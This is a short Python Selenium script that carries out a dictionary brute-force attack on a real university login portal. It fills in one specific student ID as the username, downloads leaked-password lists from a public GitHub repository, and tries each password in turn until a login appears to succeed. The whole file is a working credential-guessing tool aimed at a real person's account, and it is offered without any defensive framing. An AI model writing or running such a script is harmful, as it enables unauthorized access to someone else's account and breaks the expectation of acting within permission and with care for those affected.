from urllib.request import urlopen
from selenium.webdriver.common.by import By
from selenium import webdriver

options = webdriver.ChromeOptions()
options.add_experimental_option('excludeSwitches', ['enable-logging'])
driver = webdriver.Chrome(options=options) 
driver.get('https://portal.usu.ac.id/login/login.php')
username = driver.find_element(By.ID, 'username')
username.send_keys('211401104')
password = driver.find_element(By.NAME, 'password')

def xpath_route(routes) :
    return driver.find_element(By.XPATH,routes).click()

pass_st=True
for pr in range(100):
    s_pr=str(pr)
    if (len(str(s_pr))==1) : s_pr='0'+s_pr
    url = "https://raw.githubusercontent.com/robinske/password-data/master/passwords/part-000"+s_pr+"-abca9f4b-5795-47ee-8382-f523480a532f.csv"
    page = urlopen(url)
    html_bytes = page.read()
    html = html_bytes.decode("utf-8")
    html=html.splitlines()
    html.pop(0)
    pr_2=1
    for line in html:
        line=line.split(',')
        password.clear()
        driver.execute_script("document.getElementById('password').setAttribute('type','text');")
        password.send_keys(line[0])
        print(s_pr+'|',pr_2,'Pass='+line[0])
        xpath_route('/html/body/div[2]/div[2]/div[2]/div[1]/table/tbody/tr[3]/td[2]/input')
        try :
            xpath_route('/html/body/div[2]/div[2]/div[2]/div[1]/a')
        except :
            pass_st=False
        if (pass_st==False) : break
        pr_2+=1 
    if (pass_st==False):break
if (pass_st==False) : print('Password ditemukan')
else : print('Password tidak ditemukan')
